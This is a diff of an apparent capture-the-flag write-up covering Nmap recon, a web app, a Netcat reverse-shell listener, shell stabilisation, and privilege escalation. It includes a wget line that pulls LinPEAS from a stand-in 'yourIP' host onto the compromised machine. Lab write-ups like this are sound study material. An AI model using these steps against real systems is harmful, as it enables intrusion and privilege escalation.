@@ -3,7 +3,8 @@
 1. **Initial Reconnaissance with Nmap**
     
     - Identified an open **web service**.
-2. **Web Application Analysis**
+    
+1. **Web Application Analysis**
     
     - Accessed the service and found text input fields that returned user-provided text.
     - Attempted directory fuzzing with Gobuster, but it failed to identify any directories.
@@ -18,11 +19,7 @@
 4. **Gaining Reverse Shell Access**
     
     - Started a listener on port 9001 using Netcat:
-        
-        bash
-        
-        CopiarEditar
-        
+      
         `nc -lvnp 9001`
         
     - Verified available interpreters:
@@ -32,11 +29,7 @@
 5. **Interactive Shell Setup**
     
     - Stabilized the shell with the following commands:
-        
-        bash
-        
-        CopiarEditar
-        
+    
         `python3 -c 'import pty; pty.spawn("/bin/bash")'   stty raw -echo; fg   export TERM=xterm`  
         
 6. **Post-Exploitation Activities**
@@ -52,19 +45,11 @@
 8. **Privilege Escalation**
     
     - Set up a Python HTTP server:
-        
-        bash
-        
-        CopiarEditar
-        
+      
         `python3 -m http.server 9090`  
         
     - Used `wget` from the reverse shell to download **LinPEAS**:
-        
-        bash
-        
-        CopiarEditar
-        
+      
         `wget http://yourIP:9090/linpeas.sh   chmod +x linpeas.sh`  
         
     - Executed LinPEAS to search for sensitive files, focusing on **MAIL** directories.
